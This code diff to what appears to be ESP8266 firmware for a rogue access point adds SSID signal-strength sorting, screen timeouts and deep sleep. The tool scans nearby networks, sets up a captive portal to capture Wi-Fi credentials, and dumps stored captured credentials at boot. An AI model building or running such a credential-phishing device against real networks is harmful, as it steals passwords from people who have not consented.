@@ -102,10 +102,11 @@ volatile byte interrupt2Counter = 0;
 const int interrupt2Pin = D2;
 ClickButton updownButton(interrupt2Pin, LOW, CLICKBTN_PULLUP);
 
+long timeOfLastClick = 0;
+
 typedef void (*Screen)(void);
 SSD1306  display(0x3c, D5, D6);
 int screenState = 0;
-int counter = 1;
 long timeOfLastModeSwitch = 0;
 
 /*=====================================================
@@ -161,6 +162,7 @@ static void showMetadata(SnifferPacket *snifferPacket) {
     SSIDcount++;
     match = SSIDcount;
     SSIDlist[SSIDcount].name = SSIDcurrent;
+    SSIDlist[match].average_rssi = snifferPacket->rx_ctrl.rssi;
   }
   int matchMAC = 0;
   trig = 0;
@@ -168,6 +170,8 @@ static void showMetadata(SnifferPacket *snifferPacket) {
       if(MACcurrent == SSIDlist[match].MAClist[j]){
           trig++;
           matchMAC = j;
+          SSIDlist[match].average_rssi = (SSIDlist[match].average_rssi + snifferPacket->rx_ctrl.rssi)/2;
+
       }
   }
   if (trig == 0){
@@ -185,6 +189,16 @@ static void showMetadata(SnifferPacket *snifferPacket) {
   for ( i = 1 ; i < SSIDcount - 1 ; i++){
       for ( j = 1 ; j < SSIDcount - i - 1 ; j++){
         if(SSIDlist[j].uniques < SSIDlist[j+1].uniques){
+            SSIDswap = SSIDlist[j];
+            SSIDlist[j] = SSIDlist[j+1];
+            SSIDlist[j+1] = SSIDswap;
+        }
+      }
+  }
+
+  for ( i = 1 ; i < SSIDcount - 1 ; i++){
+      for ( j = 1 ; j < SSIDcount - i - 1 ; j++){
+        if(SSIDlist[j].average_rssi < SSIDlist[j+1].average_rssi){
             SSIDswap = SSIDlist[j];
             SSIDlist[j] = SSIDlist[j+1];
             SSIDlist[j+1] = SSIDswap;
@@ -254,13 +268,12 @@ static String getMAC(char *addr, uint8_t* data, uint16_t offset) {
   Screen states
 =====================================================*/
 
-String scan = "Scanning.";
+String scan = "Scanning";
 static void ICACHE_FLASH_ATTR displayScanning() {
-  //int progress = (counter) % 100;
-  //Serial.println(millis());
-  int progress = ((millis()*100)/STATE0_DURATION);
-    // draw the progress bar
 
+  int progress = ((millis()*100)/STATE0_DURATION);
+
+  // draw the progress bar
   display.drawProgressBar(0, 32, 120, 10, progress);
 
   // draw the percentage as String
@@ -314,6 +327,7 @@ static void ICACHE_FLASH_ATTR displayAPsetup() {
 
   // draw the progress bar
   int progress = (((millis()-timeOfLastModeSwitch)*100)/2700);
+
   // draw the percentage as String
   display.setTextAlignment(TEXT_ALIGN_CENTER);
 
@@ -333,24 +347,33 @@ static void ICACHE_FLASH_ATTR displayKEYcapture(){
   display.drawString(64, 30, "Credentials Captured:");
   display.drawString(64, 45, String(capturecount));
 }
+
+static void ICACHE_FLASH_ATTR displayTimeout(){
+  display.setTextAlignment(TEXT_ALIGN_CENTER);
+  //display.drawString(64, 0, "Entering deep sleep");
+  display.clear();
+}
+
+static void ICACHE_FLASH_ATTR screenTimeout( long timeout ){
+  if(millis() - timeOfLastModeSwitch > timeout){
+    if (timeOfLastClick == 0 || millis() - timeOfLastClick > timeout){
+      screenState = 4;
+      Serial.println("Outta time");
+    }
+  }
+}
+
 /*=====================================================
   End of Screen states
 =====================================================*/
 
-/*static void ICACHE_FLASH_ATTR handleInterrupt() {
-  interruptCounter++;
-}*/
-
-/*static void ICACHE_FLASH_ATTR handleInterrupt2() {
-  interrupt2Counter++;
-}*/
-
-#define CHANNEL_HOP_INTERVAL_MS   1000
-static os_timer_t channelHop_timer;
 
 /*=====================================================
   Channel hopping callback
 =====================================================*/
+
+#define CHANNEL_HOP_INTERVAL_MS   1000
+static os_timer_t channelHop_timer;
 
 void channelHop()
 {
@@ -368,7 +391,7 @@ void channelHop()
 #define DISABLE 0
 #define ENABLE  1
 
-Screen screens[] = { displayScanning, displaySSIDs, displayAPsetup, displayKEYcapture};
+Screen screens[] = { displayScanning, displaySSIDs, displayAPsetup, displayKEYcapture, displayTimeout};
 //int demoLength = (sizeof(screens) / sizeof(Screen));
 
 void setup() {
@@ -406,6 +429,9 @@ void setup() {
     display.flipScreenVertically();
     display.setFont(ArialMT_Plain_10);
 
+    //clearEEPROM(); //uncomment to clear stored credentials
+
+    // Dump previously captured credentials
     Serial.println();
     Serial.println("Recovered credentials:");
     int i = 0;
@@ -416,6 +442,7 @@ void setup() {
       Serial.println();
       i++;
     }
+
 }
 
 
@@ -439,41 +466,61 @@ void loop() {
   // write the buffer to the display
   display.display();
 
-  if ((millis() - timeOfLastModeSwitch > STATE0_DURATION) && numberOfInterrupts == 0) {
-
-    screenState = 1;
-    timeOfLastModeSwitch = millis();
-
-    // Disable promscious mode and turn off channel hop before setting up AP
-    wifi_promiscuous_enable(DISABLE);
-    wifi_set_promiscuous_rx_cb(NULL);
-    os_timer_disarm(&channelHop_timer);
+  if(updownButton.clicks == 1 || selectButton.clicks == 1){
+    timeOfLastClick = millis();
+    Serial.println(timeOfLastClick);
   }
 
-  if(updownButton.clicks == 1 && screenState == 1){
-    Serial.println("button clicked");
-    numberOfInterrupts2++;
+  // Clear screen and enter deep sleep
+  if(screenState == 4){
+      ESP.deepSleep(0);
   }
 
-  if(numberOfInterrupts2 >= SSIDcount){
-    numberOfInterrupts2 = 0;
+  // Escape Scanning screen after 10s
+  if(screenState == 0){
+    if ((millis() - timeOfLastModeSwitch > STATE0_DURATION)) {
+
+      screenState = 1;
+      timeOfLastModeSwitch = millis();
+      timeOfLastClick = millis();
+
+      // Disable promscious mode and turn off channel hop before setting up AP
+      wifi_promiscuous_enable(DISABLE);
+      wifi_set_promiscuous_rx_cb(NULL);
+      os_timer_disarm(&channelHop_timer);
+    }
   }
 
-  if(selectButton.clicks == 1 && screenState == 1){
-      interruptCounter++;
+  // Display SSID list
+  if( screenState == 1){
+
+    // 10s Time out on SSID list
+    screenTimeout(10000);
+
+    // increment through list on button click
+    if(updownButton.clicks == 1){
+      numberOfInterrupts2++;
+    }
+
+    // Go back to top of list
+    if(numberOfInterrupts2 >= SSIDcount){
+      numberOfInterrupts2 = 0;
+    }
+
+    // Handle selection interrupt
+    if(selectButton.clicks == 1){
+        interruptCounter++;
+    }
   }
 
+  // Setup captive portal
   if (interruptCounter == 1){
+
       interruptCounter--;
       numberOfInterrupts++;
-      //detachInterrupt(interruptPin);
-      //detachInterrupt(interrupt2Pin);
-      Serial.print("An interrupt has occurred. Total: ");
-      Serial.println(numberOfInterrupts);
 
       screenState = 2;
       timeOfLastModeSwitch = millis();
-      counter = 0;
 
       yield();
 
@@ -485,16 +532,23 @@ void loop() {
 
   }
 
-  if ((millis() - timeOfLastModeSwitch > STATE2_DURATION) && numberOfInterrupts > 0) {
+  // Escape AP Setup screen after 5s
+  if(screenState == 2){
+    if(millis() - timeOfLastModeSwitch > STATE2_DURATION){
       screenState = 3;
       timeOfLastModeSwitch = millis();
+    }
   }
 
-  if(numberOfInterrupts > 0){
-      captiveLoop();
+  // Display Credential Capture
+  if(screenState == 3){
+
+    // 60s timeout on captive portal
+    screenTimeout(60000);
+    captiveLoop();
+
   }
 
-  counter++;
   digitalWrite(LEDpin, HIGH);
 
 }
